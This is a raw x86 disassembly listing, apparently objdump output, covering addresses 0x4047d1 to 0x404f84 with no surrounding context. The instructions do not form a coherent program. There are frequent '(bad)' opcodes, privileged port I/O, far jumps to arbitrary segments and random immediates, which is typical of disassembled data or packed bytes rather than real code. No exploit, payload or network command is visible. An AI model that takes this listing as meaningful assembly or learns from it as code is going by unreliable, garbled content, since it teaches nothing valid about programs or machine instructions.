  4047d1:	test   BYTE PTR [eax-0x3f9f18cc],0xb8
  4047d8:	(bad)  
  4047d9:	mov    eax,ds:0x562a9b3c
  4047de:	stos   BYTE PTR es:[edi],al
  4047df:	nop
  4047e0:	call   0xbaa5d830
  4047e5:	or     BYTE PTR [ebx-0x65f82bb5],ch
  4047eb:	(bad)  
  4047ec:	fsub   QWORD PTR [eax-0x50]
  4047ef:	mov    bl,0xfb
  4047f1:	lds    edx,FWORD PTR [ebx-0x6b]
  4047f4:	jmp    0x1723:0x997773d2
  4047fb:	add    eax,0x903e45af
  404800:	js     0x4047a8
  404802:	call   0x301:0x3479b85f
  404809:	mov    al,0x5d
  40480b:	and    edi,edi
  40480d:	cmp    ah,dl
  40480f:	push   esp
  404810:	xchg   ebp,eax
  404811:	mov    esp,0xddfbc7ee
  404816:	stc    
  404817:	fisttp QWORD PTR [ecx]
  404819:	rcr    BYTE PTR [eax],cl
  40481b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40481c:	mov    WORD PTR [ebp+0x17],es
  40481f:	mov    esp,0x364bdca8
  404824:	xchg   esp,eax
  404825:	add    BYTE PTR [ecx+0x7096ee8f],bl
  40482b:	push   edi
  40482c:	mov    WORD PTR [ecx+0x48c9d71],cs
  404832:	mov    esi,0xf567a9eb
  404837:	jmp    0x4047e4
  404839:	mov    al,ds:0x75c9ea15
  40483e:	cmp    dl,cl
  404840:	adc    eax,0x41dc8299
  404845:	inc    edi
  404846:	popa   
  404847:	out    dx,al
  404848:	and    dh,0x45
  40484b:	arpl   bx,cx
  40484d:	mov    BYTE PTR [ebx+eiz*1-0x58],dl
  404851:	fmul   DWORD PTR [ecx-0x1a]
  404854:	mov    bh,0xd9
  404856:	add    ecx,DWORD PTR [edx-0x1b]
  404859:	popa   
  40485a:	enter  0xb59b,0x47
  40485e:	icebp  
  40485f:	out    0x6c,al
  404861:	dec    ebx
  404862:	cli    
  404863:	into   
  404864:	xchg   BYTE PTR [esi],ah
  404866:	push   esi
  404867:	out    0x64,al
  404869:	iret   
  40486a:	ret    
  40486b:	repnz adc eax,ebx
  40486e:	inc    ebx
  40486f:	out    dx,al
  404870:	push   esp
  404871:	adc    dl,BYTE PTR ds:0x7847c2f1
  404877:	imul   esi,DWORD PTR [edx-0x1d518c7b],0x7f
  40487e:	or     ah,BYTE PTR [esi+edi*8-0x37]
  404882:	icebp  
  404883:	cmp    esp,DWORD PTR [ebx+0x657111f3]
  404889:	mul    BYTE PTR [edx-0x5dc75474]
  40488f:	xchg   ebp,eax
  404890:	lea    esi,[ecx+0x614e9382]
  404896:	(bad)
  404899:	push   ebx
  40489a:	adc    ecx,DWORD PTR [edi-0x3]
  40489d:	js     0x4048e5
  40489f:	adc    dh,BYTE PTR [edi+0x29c85e92]
  4048a5:	cdq    
  4048a6:	int3   
  4048a7:	or     eax,0x61909dc3
  4048ac:	jbe    0x404885
  4048ae:	nop
  4048af:	pop    ebx
  4048b0:	adc    eax,0x7814eedc
  4048b5:	xor    al,0x55
  4048b7:	dec    esi
  4048b8:	mov    dh,0x97
  4048ba:	stos   DWORD PTR es:[edi],eax
  4048bb:	pop    esp
  4048bc:	mov    esp,0x5c5819a9
  4048c1:	bound  ebx,QWORD PTR [edx-0x34]
  4048c4:	add    al,bl
  4048c6:	outs   dx,DWORD PTR ds:[esi]
  4048c7:	test   BYTE PTR [eax-0x57],dh
  4048ca:	push   edi
  4048cb:	sbb    bl,BYTE PTR [eax-0x3b]
  4048ce:	bnd jb 0x404936
  4048d1:	scas   eax,DWORD PTR es:[edi]
  4048d2:	add    DWORD PTR [ebx-0x6f],ebx
  4048d5:	xchg   edi,eax
  4048d6:	daa    
  4048d7:	rcr    BYTE PTR [esi],0x0
  4048da:	sub    bl,BYTE PTR [ecx]
  4048dc:	lock ja 0x4048f4
  4048df:	ret    0xa36c
  4048e2:	imul   edi,DWORD PTR [ebp-0x1b29e497],0x1c
  4048e9:	and    ah,ah
  4048eb:	xchg   ebp,eax
  4048ec:	test   al,0xe9
  4048ee:	inc    esp
  4048ef:	(bad)
  4048f3:	ins    DWORD PTR es:[edi],dx
  4048f4:	scas   al,BYTE PTR es:[edi]
  4048f5:	repz fiadd DWORD PTR [eax]
  4048f8:	mov    ebx,0xfc12e633
  4048fd:	js     0x4048cc
  4048ff:	js     0x404978
  404901:	aas    
  404902:	dec    esi
  404903:	addr16 sahf 
  404905:	and    al,0xa6
  404907:	outs   dx,BYTE PTR ds:[esi]
  404908:	or     bh,BYTE PTR gs:[ecx]
  40490b:	and    edi,DWORD PTR [ebx]
  40490d:	cmp    DWORD PTR [edx-0x26721b8e],esp
  404913:	inc    eax
  404914:	xchg   ecx,eax
  404915:	inc    edi
  404916:	nop
  404917:	dec    edx
  404918:	xor    BYTE PTR [ebp-0x46330a88],bl
  40491e:	sbb    BYTE PTR [edi-0x4d],0x24
  404922:	sar    DWORD PTR [ecx-0x3f18179b],cl
  404928:	adc    cl,bl
  40492a:	push   0x77081709
  40492f:	retf   0x3a96
  404932:	add    BYTE PTR [esi+0x5f],bh
  404935:	jo     0x404914
  404937:	repz jnp 0x40498e
  40493a:	loope  0x404940
  40493c:	cmp    esi,DWORD PTR [edx+0x7f]
  40493f:	inc    ebx
  404940:	add    ch,BYTE PTR [edx]
  404942:	(bad)  
  404944:	enter  0x3041,0xbb
  404948:	mov    eax,ds:0x3d40ef7e
  40494d:	mov    WORD PTR [ebp+0x14],fs
  404950:	(bad)  
  404951:	popa   
  404952:	mov    ch,0xc6
  404954:	sar    DWORD PTR [ecx-0x2a582ebb],1
  40495a:	clc    
  40495b:	xor    dl,0x24
  40495e:	xlat   BYTE PTR ds:[ebx]
  40495f:	les    edi,FWORD PTR [ebx-0x4b9e5297]
  404965:	adc    ebx,DWORD PTR [edx-0x45]
  404968:	xchg   ecx,eax
  404969:	arpl   WORD PTR [esi+0x25],bp
  40496c:	push   es
  40496d:	push   ebp
  40496e:	cdq    
  40496f:	xchg   edi,eax
  404970:	push   ebp
  404971:	xor    esp,esi
  404973:	xchg   ebp,eax
  404974:	xchg   ecx,eax
  404975:	mov    esp,0x4498816c
  40497a:	rcl    ah,cl
  40497c:	jg     0x4049d6
  40497e:	ret    0xa3e5
  404981:	inc    esp
  404982:	(bad)  
  404983:	xchg   edi,eax
  404984:	loop   0x40497e
  404986:	sub    eax,ecx
  404988:	adc    BYTE PTR [edi-0x2ae85088],dh
  40498e:	xchg   esp,eax
  40498f:	nop
  404990:	(bad)  
  404991:	neg    BYTE PTR [ebx+0x3432523]
  404997:	stos   DWORD PTR es:[edi],eax
  404998:	fidivr WORD PTR [ebx-0x592afa00]
  40499e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40499f:	or     ch,BYTE PTR [esi-0x8]
  4049a2:	hlt    
  4049a3:	fwait
  4049a4:	cli    
  4049a5:	test   eax,0x5b96aae4
  4049aa:	test   eax,0xae752846
  4049af:	repnz cmc 
  4049b1:	scas   al,BYTE PTR es:[edi]
  4049b2:	mov    bl,0xf6
  4049b4:	push   ss
  4049b5:	xchg   ebx,eax
  4049b6:	shr    esp,cl
  4049b8:	pop    ecx
  4049b9:	bound  edx,QWORD PTR [eax-0x37]
  4049bc:	jl     0x404993
  4049be:	cmp    al,0x5d
  4049c0:	cmp    ah,BYTE PTR [ecx]
  4049c2:	ja     0x404983
  4049c4:	mov    bh,0x54
  4049c6:	ffreep st(2)
  4049c8:	add    al,0xc9
  4049ca:	sbb    cl,bh
  4049cc:	mov    esi,0x3e5f6d77
  4049d1:	push   0x3ace7ae6
  4049d6:	dec    edi
  4049d7:	es jl  0x4049c6
  4049da:	add    cl,BYTE PTR [ebx]
  4049dc:	sbb    dl,ch
  4049de:	ins    BYTE PTR es:[edi],dx
  4049df:	out    0xbd,al
  4049e1:	aaa    
  4049e2:	mov    eax,0xc7d6335e
  4049e7:	push   0xffffffa9
  4049e9:	mov    ecx,0x84424d14
  4049ee:	in     ax,0x52
  4049f1:	pop    ebp
  4049f2:	in     eax,0xe9
  4049f4:	push   esi
  4049f5:	jge    0x4049dd
  4049f7:	and    esp,esi
  4049f9:	jmp    0xf16b:0x83c28fd6
  404a00:	(bad)  
  404a01:	adc    edi,DWORD PTR [ecx-0x49855b8f]
  404a07:	xor    DWORD PTR [esi],ecx
  404a09:	or     BYTE PTR [edx+0x56],0xa0
  404a0d:	es pop edx
  404a0f:	dec    esi
  404a10:	mov    bl,0xa2
  404a12:	retf   0xc79
  404a15:	mov    ebx,0xcc47be36
  404a1a:	das    
  404a1b:	test   DWORD PTR [ebx+0x8],edi
  404a1e:	hlt    
  404a1f:	popf   
  404a20:	xchg   edi,eax
  404a21:	mov    dh,0x17
  404a23:	test   BYTE PTR [ebx-0x65ffe640],0x7f
  404a2a:	adc    DWORD PTR [eax-0x2ca5ba41],esp
  404a30:	int3   
  404a31:	ins    BYTE PTR es:[edi],dx
  404a32:	call   0x45721ff9
  404a37:	jmp    0x10e7:0x87dda55d
  404a3e:	ret    0x1bd4
  404a41:	adc    ebx,eax
  404a43:	loope  0x404a5a
  404a45:	cdq    
  404a46:	scas   al,BYTE PTR es:[edi]
  404a47:	jl     0x404a3a
  404a49:	scas   eax,DWORD PTR es:[edi]
  404a4a:	pop    ds
  404a4b:	lds    eax,FWORD PTR [ebp-0x3]
  404a4e:	xchg   edx,eax
  404a4f:	ficom  DWORD PTR [eax]
  404a51:	add    DWORD PTR [esi-0x6df0910c],esi
  404a57:	cmp    esp,DWORD PTR [ecx]
  404a59:	mov    edx,DWORD PTR [ebx+0x57f6c780]
  404a5f:	bound  esp,QWORD PTR [edi]
  404a61:	adc    eax,ecx
  404a63:	les    ebp,FWORD PTR ds:0x96fd0565
  404a69:	pop    ss
  404a6a:	jmp    0xf5c75124
  404a6f:	stos   BYTE PTR es:[edi],al
  404a70:	retf   0xff2f
  404a73:	fwait
  404a74:	jbe    0x404a11
  404a76:	and    ebx,eax
  404a78:	pop    ebp
  404a79:	mov    al,0xe3
  404a7b:	jno    0x404ab1
  404a7d:	adc    DWORD PTR [ebp+0x4976b441],edx
  404a83:	inc    eax
  404a84:	rcr    BYTE PTR [esi+0x1f85977a],0xa
  404a8b:	dec    esi
  404a8c:	and    ch,BYTE PTR [ebx-0x68]
  404a8f:	xor    eax,0xda251fc9
  404a94:	fidivr DWORD PTR [edi+0x51454c45]
  404a9a:	repnz xchg esi,eax
  404a9c:	mov    bl,0x37
  404a9e:	add    al,0x3f
  404aa0:	mov    bh,0xd1
  404aa2:	push   0x4e492e43
  404aa7:	lahf   
  404aa8:	jne    0x404abd
  404aaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404aab:	add    al,0x58
  404aad:	pop    ecx
  404aae:	jmp    0x62376238
  404ab3:	push   ds
  404ab4:	jle    0x404a7f
  404ab6:	inc    ebp
  404ab7:	js     0x404b32
  404ab9:	data16 aam 0xd3
  404abc:	clc    
  404abd:	sbb    BYTE PTR [ebx+0x90b4631],bl
  404ac3:	cmp    ah,BYTE PTR [ebx-0x63]
  404ac6:	xchg   ecx,eax
  404ac7:	out    0x3f,eax
  404ac9:	cwde   
  404aca:	mov    dl,0x8e
  404acc:	popa   
  404acd:	sub    dl,al
  404acf:	sub    ecx,DWORD PTR [edi-0x57ce9a09]
  404ad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ad6:	shr    DWORD PTR [edi+0x4f4d6288],0x5a
  404add:	popf   
  404ade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404adf:	sbb    ecx,DWORD PTR [esi+0x69]
  404ae2:	das    
  404ae3:	js     0x404a8a
  404ae5:	push   ebp
  404ae6:	fdivr  st,st(6)
  404ae8:	push   0xbc1895dc
  404aed:	pusha  
  404aee:	arpl   WORD PTR [edi-0x3b],bx
  404af1:	xchg   ebp,eax
  404af2:	xor    ecx,DWORD PTR [ebp-0x67]
  404af5:	ffree  st(3)
  404af7:	add    edi,edx
  404af9:	inc    ebx
  404afa:	hlt    
  404afb:	stos   DWORD PTR es:[edi],eax
  404afc:	xlat   BYTE PTR ds:[ebx]
  404afd:	call   0x8aa7:0x7e2be657
  404b04:	lahf   
  404b05:	test   eax,0xf503b254
  404b0a:	pushf  
  404b0b:	add    BYTE PTR [ecx],0xb8
  404b0e:	stc    
  404b0f:	push   es
  404b10:	fs add dh,bh
  404b13:	aam    0x4d
  404b15:	sub    edi,DWORD PTR [eax+0x43]
  404b18:	out    0xfd,eax
  404b1a:	in     eax,dx
  404b1b:	fist   WORD PTR [ecx]
  404b1d:	push   ss
  404b1e:	aam    0x48
  404b20:	gs shl edi,1
  404b23:	cld    
  404b24:	aad    0xbc
  404b26:	stos   BYTE PTR es:[edi],al
  404b27:	jnp    0x404af1
  404b29:	nop
  404b2a:	je     0x404ada
  404b2c:	add    eax,0x7ad5de5a
  404b31:	jns    0x404b05
  404b33:	call   0xd8f8:0x34730a19
  404b3a:	out    dx,eax
  404b3b:	mov    bh,0xf2
  404b3d:	scas   eax,DWORD PTR es:[edi]
  404b3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b3f:	or     eax,0x999ddae4
  404b44:	cmp    dh,BYTE PTR [eax+ecx*8-0xc]
  404b48:	fcomp  DWORD PTR [esi-0x36]
  404b4b:	aas    
  404b4c:	dec    BYTE PTR ds:0x704b9259
  404b52:	sub    eax,0x1135f5fe
  404b57:	js     0x404ae9
  404b59:	test   DWORD PTR [edx+0x6b2b0e5a],esi
  404b5f:	loop   0x404af0
  404b61:	mov    eax,ds:0x3effaaaa
  404b66:	icebp  
  404b67:	inc    edi
  404b68:	popa   
  404b69:	fsub   DWORD PTR [esp+edi*8+0x69]
  404b6d:	mov    edx,0xa743b152
  404b72:	div    BYTE PTR [ebx+0x6cc46eec]
  404b78:	fisubr DWORD PTR [ebp+edi*4-0xd051a17]
  404b7f:	cdq    
  404b80:	add    ecx,DWORD PTR [eax+0xe]
  404b83:	(bad)  
  404b84:	aad    0xb
  404b86:	fadd   QWORD PTR [ebx+0x78]
  404b89:	aas    
  404b8a:	bound  esi,QWORD PTR [esi]
  404b8c:	rol    BYTE PTR [edi-0x41beb115],cl
  404b92:	push   eax
  404b93:	in     eax,dx
  404b94:	cmp    al,0x80
  404b96:	popf   
  404b97:	jp     0x404b39
  404b99:	xor    dl,BYTE PTR [edi+0x38639ff4]
  404b9f:	adc    edi,eax
  404ba1:	nop
  404ba2:	pop    esi
  404ba3:	jg     0x404c0e
  404ba5:	mov    ah,0xab
  404ba7:	jae    0x404bbd
  404ba9:	adc    BYTE PTR [edx+0x20],ch
  404bac:	inc    edi
  404bad:	int    0x60
  404baf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bb0:	sti    
  404bb1:	lds    ebx,FWORD PTR [ebx+0x5bb03442]
  404bb7:	pop    edx
  404bb8:	jno    0x404baa
  404bba:	mov    BYTE PTR [ebx-0x5cf0caa2],cl
  404bc0:	(bad)  
  404bc1:	adc    dl,cl
  404bc3:	je     0x404b61
  404bc5:	iret   
  404bc6:	adc    BYTE PTR gs:[eax-0xb129930],ah
  404bcd:	push   cs
  404bce:	pop    eax
  404bcf:	leave  
  404bd0:	addr16 pop es
  404bd2:	scas   al,BYTE PTR es:[edi]
  404bd3:	cwde   
  404bd4:	retf   
  404bd5:	push   0x23d58f87
  404bda:	shr    esi,cl
  404bdc:	sar    DWORD PTR [edx-0x12],cl
  404bdf:	pop    ss
  404be0:	shl    BYTE PTR ds:0xb9a65c89,1
  404be6:	pop    edi
  404be7:	push   esi
  404be8:	xor    eax,DWORD PTR [esi+edi*8]
  404beb:	cmp    eax,0xecdbb156
  404bf0:	inc    esi
  404bf1:	xchg   ebx,eax
  404bf2:	push   0xffffff80
  404bf4:	sbb    DWORD PTR [edx+0x1f4f4f50],esp
  404bfa:	mov    al,0x72
  404bfc:	sub    al,0x60
  404bfe:	xchg   edx,eax
  404bff:	dec    eax
  404c00:	xchg   esi,eax
  404c01:	jp     0x404c0f
  404c03:	jmp    0x2a84728e
  404c08:	mov    ah,0x7a
  404c0a:	xchg   ecx,eax
  404c0b:	or     eax,0xc01d32b1
  404c10:	dec    esi
  404c11:	iret   
  404c12:	(bad)  
  404c13:	jb     0x404c64
  404c15:	int3   
  404c16:	jae    0x404c06
  404c18:	gs mov bl,0x1f
  404c1b:	ins    BYTE PTR es:[edi],dx
  404c1c:	or     ecx,DWORD PTR [esi]
  404c1e:	xor    DWORD PTR [ecx+0x3b],ecx
  404c21:	add    eax,0xa8e032f
  404c26:	push   ebp
  404c27:	mov    ebp,0x89c90c76
  404c2c:	push   0xaf584e02
  404c31:	scas   al,BYTE PTR es:[edi]
  404c32:	mov    dl,0x28
  404c34:	cmp    eax,DWORD PTR [ebx]
  404c36:	std    
  404c37:	adc    edx,ebx
  404c39:	int3   
  404c3a:	imul   eax,DWORD PTR [eax-0xdc0fd03],0xf4696795
  404c44:	es leave 
  404c46:	pop    ss
  404c47:	mov    dh,0xee
  404c49:	push   edi
  404c4a:	cmp    DWORD PTR [ecx-0x5d],eax
  404c4d:	mov    WORD PTR ds:0xeb5c0651,ds
  404c53:	rcr    bl,1
  404c55:	es jne 0x404c68
  404c58:	dec    eax
  404c59:	mov    ds:0x6eb65b2e,eax
  404c5e:	push   eax
  404c5f:	outs   dx,BYTE PTR ds:[esi]
  404c60:	xlat   BYTE PTR ds:[ebx]
  404c61:	sti    
  404c62:	inc    ebp
  404c63:	mov    al,ds:0x5309bee1
  404c68:	(bad)  
  404c69:	hlt    
  404c6a:	jae    0x404c99
  404c6c:	inc    edi
  404c6d:	int    0x2f
  404c6f:	ror    DWORD PTR [ebx+0x9],cl
  404c72:	ja     0x404c62
  404c74:	ds jbe 0x404c92
  404c77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c78:	lock lea eax,[ebp-0x212febb]
  404c7f:	inc    esi
  404c80:	cmp    ecx,esp
  404c82:	pushf  
  404c83:	jp     0x404c1e
  404c85:	inc    ebp
  404c86:	icebp  
  404c87:	test   al,0xfd
  404c89:	mov    edi,DWORD PTR [edx]
  404c8b:	inc    edi
  404c8c:	mov    dl,0xd8
  404c8e:	or     dl,BYTE PTR [ebp+0x1b]
  404c91:	add    eax,0xc138e7e5
  404c96:	popf   
  404c97:	add    dl,0x62
  404c9a:	jge    0x404cb1
  404c9c:	fisttp DWORD PTR [edx]
  404c9e:	dec    edi
  404c9f:	das    
  404ca0:	and    al,0xe1
  404ca2:	out    dx,eax
  404ca3:	gs pop es
  404ca5:	bound  ebp,QWORD PTR [eax+0x7055df26]
  404cab:	js     0x404d2b
  404cad:	push   es
  404cae:	push   0x25c78f2e
  404cb3:	jp     0x404d27
  404cb5:	pop    esp
  404cb6:	inc    edi
  404cb7:	pop    edi
  404cb8:	push   cs
  404cb9:	ss jae 0x404c71
  404cbc:	jnp    0x404ca8
  404cbe:	pop    esp
  404cc0:	(bad)  
  404cc1:	cmp    eax,DWORD PTR [eax+0x1e]
  404cc4:	fldenv [ebp-0x5332b9f0]
  404cca:	mov    edx,0xb62f11f6
  404ccf:	cmp    al,0xaf
  404cd1:	dec    edx
  404cd2:	das    
  404cd3:	int3   
  404cd4:	std    
  404cd5:	aas    
  404cd6:	out    dx,al
  404cd7:	shl    DWORD PTR [edi-0x7],cl
  404cda:	fistp  DWORD PTR [ebx-0x27978bfa]
  404ce0:	add    edx,DWORD PTR [edx+0x2a]
  404ce3:	pop    edi
  404ce4:	sbb    al,0xee
  404ce6:	xchg   edx,eax
  404ce7:	ret    
  404ce8:	cli    
  404ce9:	gs push esi
  404ceb:	jns    0x404d37
  404ced:	bound  esi,QWORD PTR [ebx]
  404cef:	sub    edx,DWORD PTR [ebp-0xa]
  404cf2:	lods   eax,DWORD PTR ds:[esi]
  404cf3:	dec    ebx
  404cf4:	ffreep st(4)
  404cf6:	(bad)  
  404cf7:	sub    ebp,ebp
  404cf9:	push   ebp
  404cfa:	data16 jbe 0x404cbd
  404cfd:	xchg   esp,eax
  404cfe:	pop    ebx
  404cff:	and    eax,DWORD PTR [eax+0x38]
  404d02:	mov    edi,DWORD PTR [edi+0x4c]
  404d05:	mov    eax,0x8bb2eace
  404d0a:	imul   edi,DWORD PTR [ebx],0xffffffed
  404d0d:	pop    es
  404d0e:	fcom   QWORD PTR [ebp+0x492c1937]
  404d14:	lahf   
  404d15:	cmp    al,0xa1
  404d17:	cdq    
  404d18:	or     eax,0x9153c576
  404d1d:	rcl    BYTE PTR ds:0xd4a83a51,1
  404d23:	inc    ebx
  404d24:	mov    bh,0xb1
  404d26:	jns    0x404d78
  404d28:	fs mov edi,edx
  404d2b:	daa    
  404d2c:	fwait
  404d2d:	call   0xfd2d593e
  404d32:	adc    DWORD PTR [esi],0xb
  404d35:	dec    ebx
  404d36:	dec    eax
  404d37:	mov    esp,0x92a65a1b
  404d3c:	xchg   ecx,eax
  404d3d:	gs hlt 
  404d3f:	jmp    0x4a26:0x14f1c360
  404d46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d47:	ins    BYTE PTR es:[edi],dx
  404d48:	inc    edx
  404d49:	retf   
  404d4a:	rcl    BYTE PTR [ebp-0x4c183223],cl
  404d50:	in     al,0x9b
  404d52:	(bad)  
  404d53:	sbb    al,0x27
  404d55:	leave  
  404d56:	in     al,dx
  404d57:	xchg   ebx,eax
  404d58:	cmp    ah,BYTE PTR ds:0x106a7beb
  404d5e:	pop    edx
  404d5f:	mov    ds:0xd403c133,eax
  404d64:	repnz rol BYTE PTR [edi+0x70],1
  404d68:	push   0x5b19d6ca
  404d6d:	pop    ecx
  404d6e:	xchg   edi,eax
  404d6f:	xor    al,BYTE PTR [eax-0x438be94e]
  404d75:	mov    ch,0x9
  404d77:	xor    al,0x5d
  404d79:	out    dx,al
  404d7a:	test   eax,0x86d73e98
  404d7f:	stos   DWORD PTR es:[edi],eax
  404d80:	inc    esi
  404d81:	ins    DWORD PTR es:[edi],dx
  404d82:	mov    al,0xef
  404d84:	iret   
  404d85:	js     0x404de1
  404d87:	arpl   WORD PTR [edx+0xc],ax
  404d8a:	pop    esi
  404d8b:	or     DWORD PTR [eax-0x41402c2e],eax
  404d91:	push   edi
  404d92:	mov    ds:0xa9d2133e,eax
  404d97:	mov    esi,DWORD PTR [ebp+0x328094dd]
  404d9d:	shl    BYTE PTR [edx-0x46],1
  404da0:	faddp  st(7),st
  404da2:	mov    bl,0x7d
  404da4:	inc    ecx
  404da5:	out    dx,al
  404da6:	mov    dl,bh
  404da8:	add    al,0xc1
  404daa:	out    0x88,al
  404dac:	les    ecx,FWORD PTR ds:0x70d76642
  404db2:	shr    BYTE PTR [edi-0x52eb85c0],cl
  404db8:	retf   
  404db9:	sbb    eax,0xf3d8892
  404dbe:	sbb    BYTE PTR [edi-0x5ce00c1a],ch
  404dc4:	mov    ds,WORD PTR [ecx-0x7102bb2e]
  404dca:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  404dcc:	inc    edi
  404dcd:	mov    edi,0xdf4cee3e
  404dd2:	sbb    bh,BYTE PTR [ebx+0x42]
  404dd5:	cdq    
  404dd6:	push   eax
  404dd7:	cmp    BYTE PTR [ebp+0x11],dl
  404dda:	dec    edx
  404ddb:	jae    0x404e2c
  404ddd:	imul   eax,esi,0xffffffe0
  404de0:	sahf   
  404de1:	dec    esi
  404de2:	push   ss
  404de3:	ins    BYTE PTR es:[edi],dx
  404de4:	push   ecx
  404de5:	mov    esi,0xb238587c
  404dea:	jp     0x404e32
  404dec:	call   FWORD PTR [ebx-0x7ede8f9e]
  404df2:	(bad)  
  404df3:	cmc    
  404df4:	sbb    BYTE PTR [esp+ebp*2+0xeb93ae2],dh
  404dfb:	jmp    edi
  404dfd:	retf   0xeb3b
  404e00:	lock adc al,0x42
  404e03:	out    dx,al
  404e04:	or     DWORD PTR ds:0x61110ce2,edi
  404e0a:	in     al,dx
  404e0b:	ret    
  404e0c:	mov    al,0xab
  404e0e:	mov    al,0x63
  404e10:	loope  0x404dc8
  404e12:	(bad)  
  404e13:	icebp  
  404e14:	in     al,dx
  404e15:	xlat   BYTE PTR ds:[ebx]
  404e16:	or     DWORD PTR [eax],0xea8f4040
  404e1c:	mul    BYTE PTR [ebp-0x13e5bb68]
  404e22:	sbb    al,0x1
  404e24:	retf   0x621d
  404e27:	sbb    ah,dh
  404e29:	dec    edi
  404e2a:	scas   eax,DWORD PTR es:[edi]
  404e2b:	pusha  
  404e2c:	add    esp,ecx
  404e2e:	mov    BYTE PTR [eax-0x18ebeb7a],dh
  404e34:	fdiv   st(0),st
  404e36:	lock mov dh,0x8e
  404e39:	shr    DWORD PTR [eax],1
  404e3b:	jmp    0x9ed4:0xd325a348
  404e42:	or     dh,bh
  404e44:	add    bh,BYTE PTR ds:0x1966cd05
  404e4a:	shl    DWORD PTR [edi-0x6e],cl
  404e4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e4e:	jbe    0x404e77
  404e50:	(bad)
  404e53:	mov    esi,0x9e31badf
  404e58:	les    ebp,FWORD PTR [ecx-0x2fa991fa]
  404e5e:	mov    al,BYTE PTR [ebp+0x12b7cd19]
  404e64:	pop    esp
  404e65:	inc    ebp
  404e66:	jmp    0xe0947eb7
  404e6b:	jmp    0x404e70
  404e6d:	or     BYTE PTR [esi+0x3e],bl
  404e70:	mov    WORD PTR [edx],es
  404e72:	das    
  404e73:	pusha  
  404e74:	inc    ebp
  404e75:	retf   0x3c38
  404e78:	popa   
  404e79:	or     al,0x21
  404e7b:	push   esp
  404e7c:	(bad)  
  404e7d:	sbb    BYTE PTR [ebp-0x13b86580],cl
  404e83:	bound  ebx,QWORD PTR ds:0x5dbe68c8
  404e89:	out    0xf7,eax
  404e8b:	repnz fadd st(7),st
  404e8e:	in     al,dx
  404e8f:	mov    ebx,0xaaec6629
  404e94:	in     eax,0x8d
  404e96:	pop    esi
  404e97:	pop    edi
  404e98:	xchg   esi,eax
  404e99:	rol    bl,0xb6
  404e9c:	retf   0x7534
  404e9f:	and    eax,0x398d0b65
  404ea4:	mov    ebx,0xb3f52311
  404ea9:	sub    al,0xbb
  404eab:	out    0x88,eax
  404ead:	inc    edi
  404eae:	add    BYTE PTR [ebp+0x2e],0x2f
  404eb2:	inc    esp
  404eb3:	mov    ebx,0xf6a6d9d2
  404eb8:	test   al,0x3
  404eba:	out    0x7f,al
  404ebc:	adc    al,0x9d
  404ebe:	scas   eax,DWORD PTR es:[edi]
  404ebf:	pushf  
  404ec0:	fsubr  st,st(5)
  404ec2:	xchg   edi,eax
  404ec3:	xor    al,0xc1
  404ec5:	pop    DWORD PTR [eax-0x53]
  404ec8:	xchg   ah,al
  404eca:	in     eax,0x33
  404ecc:	repz cmp al,0x4
  404ecf:	das    
  404ed0:	rol    BYTE PTR [ebp-0x2c1547c8],0xfb
  404ed7:	out    dx,al
  404ed8:	jmp    0x67a6:0x7a1d618c
  404edf:	jae    0x404e8a
  404ee1:	les    edi,FWORD PTR [ebx-0x62]
  404ee4:	or     ch,dh
  404ee6:	lds    ecx,FWORD PTR [edx]
  404ee8:	lods   eax,DWORD PTR ds:[esi]
  404ee9:	cmp    ah,BYTE PTR [esi-0x18]
  404eec:	mov    bl,0x89
  404eee:	jl     0x404e9e
  404ef0:	xor    al,0x97
  404ef2:	pop    edx
  404ef3:	popf   
  404ef4:	mov    bl,0x4c
  404ef6:	mov    esi,0xb0d6a289
  404efb:	mov    cl,BYTE PTR ds:0xb5e2f262
  404f01:	jle    0x404f50
  404f03:	and    eax,0x3c23afd7
  404f08:	mov    al,ds:0x8dbd211c
  404f0d:	aaa    
  404f0e:	hlt    
  404f0f:	addr16 retf 
  404f11:	call   0xb50d96b4
  404f16:	xchg   ebx,eax
  404f17:	fld    TBYTE PTR [esi]
  404f19:	dec    ecx
  404f1a:	dec    ecx
  404f1b:	xor    eax,0x28fc3d31
  404f20:	sbb    DWORD PTR [edi-0x781eed77],ebx
  404f26:	ficomp DWORD PTR ds:0x869dd748
  404f2c:	or     DWORD PTR [eax+edx*1],edi
  404f2f:	inc    esp
  404f30:	mov    ds:0xc1664d20,eax
  404f35:	neg    al
  404f37:	xor    bl,dh
  404f39:	call   0xe9980000
  404f3e:	fild   QWORD PTR [esi+0x74]
  404f41:	adc    al,0xa6
  404f43:	push   ebp
  404f44:	shl    DWORD PTR [ebx],0xf1
  404f47:	xchg   ebx,eax
  404f48:	push   eax
  404f49:	jns    0x404fc9
  404f4b:	push   ecx
  404f4c:	pop    ebp
  404f4d:	fadd   QWORD PTR [edi-0x80]
  404f50:	(bad)  
  404f51:	pop    ebx
  404f52:	xchg   esi,eax
  404f53:	mov    bl,0x76
  404f55:	dec    edx
  404f56:	ins    DWORD PTR es:[edi],dx
  404f57:	retf   0x70ae
  404f5a:	inc    ebx
  404f5b:	adc    edi,edi
  404f5d:	cmp    bl,BYTE PTR [esi]
  404f5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f61:	loope  0x404f59
  404f63:	in     al,0x3a
  404f65:	add    dh,BYTE PTR [edx]
  404f67:	pop    edx
  404f68:	pusha  
  404f69:	loope  0x404fa6
  404f6b:	pop    ecx
  404f6c:	add    al,BYTE PTR [edx+esi*8-0x50]
  404f70:	mov    ds:0x1cb86958,eax
  404f75:	or     ch,al
  404f77:	fmul   DWORD PTR [edi+eiz*1-0x36]
  404f7b:	push   ebx
  404f7c:	lods   eax,DWORD PTR ds:[esi]
  404f7d:	cmp    DWORD PTR [ebx+edi*8-0x6aa3f5ca],eax
  404f84:	mov    DWORD PTR [esi+0x4c],esi
